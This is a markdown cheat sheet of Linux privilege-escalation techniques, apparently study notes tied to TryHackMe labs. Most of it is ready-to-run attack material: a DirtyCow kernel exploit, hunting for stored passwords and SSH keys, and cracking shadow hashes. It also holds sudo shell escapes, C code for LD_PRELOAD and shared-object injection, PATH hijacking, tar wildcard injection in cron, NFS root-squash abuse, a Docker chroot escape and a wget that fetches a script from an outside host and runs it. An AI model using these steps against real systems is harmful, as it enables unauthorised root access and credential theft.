# Linux Privilege Escalation

<details>
 <summary>Resources</summary>

- [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

- [Linux Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

- [Checklist - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)

- [Sushant 747's Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)

- [Linux PrivEsc Lab](https://tryhackme.com/room/linuxprivescarena)

</details>
 
## Initial Enumeration

<details>
 <summary>System Enumeration</summary>

```
hostname
```
```
uname -a
```
```
cat /proc/version
```
```
cat /etc/issue
```
```
lscpu
```
```
ps aux
```
</details>

<details>
 <summary>User Enumeration</summary>

```
whoami
```
```
id
```
```
sudo -l
```
```
cat /etc/passwd
cat /etc/passwd |cut -d : -f 1
```
```
cat /etc/shadow
```
```
cat /etc/group
```
```
history
```
</details>

<details>
 <summary>Network Enumeration</summary>

```
ifconfig
ip a
```
```
route
ip route
```
```
arp -a
ip neigh
```
```
netstat -ano
```
</details>

<details>
 <summary>Password Hunting</summary>

```
grep --color=auto -rnm '/' -ie "PASSWORD" --color=always 2> /dev/null
```
```
locate password | more
locate passw | more
```
```
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2>
 /dev/null
```
</details>

## Automated Tools

<details>
 <summary>Resources</summary>

- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

- [LinEnum](https://github.com/rebootuser/LinEnum)

- [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)

- [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker)
</details>

## Escalation Path: Kernel Exploits

<details>
 <summary>Example</summary>

- [Kernel Exploits](https://github.com/lucyoa/kernel-exploits)

- [DirtyCow](https://github.com/dirtycow/dirtycow.github.io)

Victim:

```
gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
./c0w
passwd
id
```
 </details>

## Escalation Path: Passwords and File Permissions

<details>
 <summary>Example</summary>
 
```
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```
 </details>

<details>
 <summary>Stored Passwords (Config Files)</summary>

Victim:

```
cat /home/user/myvpn.ovpn
```

- From the output, make note of the value of the “auth-user-pass” directive.

```
cat /etc/openvpn/auth.txt
```

- From the output, make note of the clear-text credentials.

```
cat /home/user/.irssi/config | grep -i passw
```

- From the output, make note of the clear-text credentials.
</details>

<details>
 <summary>Stored Passwords (History)</summary>

Victim:

```
history | grep pass
cat ~/.bash_history | grep -i passw
```

- From the output, make note of the clear-text credentials.
</details>

<details>
 <summary>Weak File Permissions</summary>

Victim:

```
ls -la /etc/passwd
ls -la /etc/shadow
```

- Note the file permissions

```
cat /etc/passwd
```

- Save the output to a file on your attacker machine

```
cat /etc/shadow
```

- Save the output to a file on your attacker machine

Kali:

```
unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt
```

```
hashcat -m 1800 unshadowed.txt rockyou.txt -O
```
 </details>
 
<details>
 <summary>SSH Keys</summary>

Victim:

```
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
```

- Note the results.
- Copy the contents of the discovered id_rsa file to a file on your attacker VM.

Kali:

```
chmod 400 id_rsa
ssh -i id_rsa root@<ip>
```
 </details>

## Escalation Path: Sudo
 
<details>
 <summary>Example</summary>
 
```
sudo -l
```

- From the output, notice the list of programs that can run via sudo.
 </details>
 
<details>
 <summary>Escalation via Sudo Shell Escaping</summary>

- [GTFOBins](https://gtfobins.github.io/)
- [Linux PrivEsc Playground](https://tryhackme.com/room/privescplayground)

```
sudo find /bin -name nano -exec /bin/sh \;
sudo awk 'BEGIN {system("/bin/sh")}'
echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
sudo vim -c '!sh'
```
 </details>

<details>
 <summary>Escalation via Intended Functionality</summary>

- [wget example](https://veteransec.com/2018/09/29/hack-the-box-sunday-walkthrough/)

Victim:

```
sudo apache2 -f /etc/shadow
```

Attacker:

```
echo '[Pasted Root Hash]' > hash.txt
john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
```

- From the output, notice the cracked credentials.
 </details>

<details>
 <summary>Escalation via LD_PRELOAD</summary>

- Open Text Editor

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
- Save the file as x.c

```
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so apache2
id
```
 </details>

## Escalation Path: SUID

<details>
 <summary>Escalation via SUID</summary>

```
find / -perm -u=s =type f 2>/dev/null
```

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

</details>


<details>
 <summary>Escalation via Shared Object Injection</summary>

```
find / -type f -perm -04000 -ls 2>/dev/null
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```

```
mkdir /home/user/.config
cd /home/user/.config
```

Open text editor

```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

- Save the file as libcalc.c

```
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
/usr/local/bin/suid-so
id
```

</details>

<details>
 <summary>Escalation via Binary Symlinks</summary>

- [Nginx Exploit](https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html)

```
./linux-exploit-suggester.sh
dpkg -l | grep nginx
ls -la /var/log/nginx
```

- From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3.

Linux VM – Terminal 1:

```
su root
```
- The root password is password123

```
su -l www-data
/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
```

- At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.

Linux VM – Terminal 2:

```
su root
```

- The root password is password123

```
invoke-rc.d nginx rotate >/dev/null 2>&1
```

- Switch back to the previous terminal.

Linux VM – Terminal 1:

- From the output, notice that the exploit continued its execution.

```
id
```

</details>

<details>
 <summary>Escalation via Shared Object Injection</summary>

```
find / -type f -perm -04000 -ls 2>/dev/null
strings /usr/local/bin/suid-env
```

- From the output, notice the functions used by the binary.

```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service
export PATH=/tmp:$PATH
/usr/local/bin/suid-env
id
```

```
find / -type f -perm -04000 -ls 2>/dev/null
strings /usr/local/bin/suid-env2
```

- From the output, notice the functions used by the binary.

Exploitation Method 1:

```
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```

Exploitation Method 2:

```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

</details>

## Escalation Path: Capabilities

<details>
 <summary>Escalation via Capabilities</summary>


- [Linux Privilege Escalation using Capabilities](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)

- [SUID vs Capabilities](https://mn3m.info/posts/suid-vs-capabilities/)

- [Linux Capabilities Privilege Escalation](https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099)

```
getcap -r / 2>/dev/null
```

- From the output, notice the value of the “cap_setuid” capability.

```
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

</details>

## Escalation Path: Scheduled Tasks

<details>
 <summary>Escalation via Cron Paths</summary>

```
cat /etc/crontab
```

- From the output, notice the value of the “PATH” variable.

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
```

- Wait for the Bash script to execute.

```
/tmp/bash -p
id
```

</details>

<details>
 <summary>Escalation via Cron Wildcards</summary>

```
cat /etc/crontab
```

- From the output, notice the script “/usr/local/bin/compress.sh”

```
cat /usr/local/bin/compress.sh
```

- From the output, notice the wildcard (*) used by ‘tar’.

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\ runme.sh
```

- Wait for the Bash script to execute.

```
/tmp/bash -p
id
```

</details>

<details>
 <summary>Escalation via Cron File Overwrites</summary>

```
cat /etc/crontab
```

- From the output, notice the script "overwrite.sh"

```
ls -l /usr/local/bin/overwrite.sh
```

- From the output, notice the file permissions.

```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
```

- Wait for the Bash script to execute.

```
/tmp/bash -p
id
```

</details>

<details>
 <summary>Challenge</summary>

[CMess](https://tryhackme.com/room/cmess)

```
cat /etc/crontab
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/andre/backup/shell.sh
```

- Wait for the Bash script to execute.

```
/tmp/bash -p
id
```

</details>

## Escalation Path: NFS Root Squashing

<details>
 <summary>Escalation via NFS Root Squashing</summary>

```
cat /etc/exports
```

- From the output, notice that “no_root_squash” option is defined for the “/tmp” export.

Attacker VM:

```
showmount -e MACHINE_IP
mkdir /tmp/1
mount -o rw,vers=2 MACHINE_IP:/tmp /tmp/1
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
gcc /tmp/1/x.c -o /tmp/1/x
chmod +s /tmp/1/x
```

Linux VM:

```
/tmp/x
id
```

</details>

## Escalation Path: Docker

<details>
 <summary>Escalation via Docker</summary>

- [UltraTech](https://tryhackme.com/room/ultratech1)

```
cd /tmp
wget hxxp[:]//10.11.4.114/lunenum.sh
./linenum.sh
```

- From output, notice you are a member of the docker group.

```
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

</details>

## Capstone Challenge

<details>
 <summary>TryHackMe Machines</summary>

- [LazyAdmin](https://tryhackme.com/room/lazyadmin)
- [Anonymous](https://tryhackme.com/room/anonymous)
- [Tomghost](https://tryhackme.com/room/tomghost)
- [ConvertMyVideo](https://tryhackme.com/room/convertmyvideo)
- [Brainpan 1](https://tryhackme.com/room/brainpan)

</details>
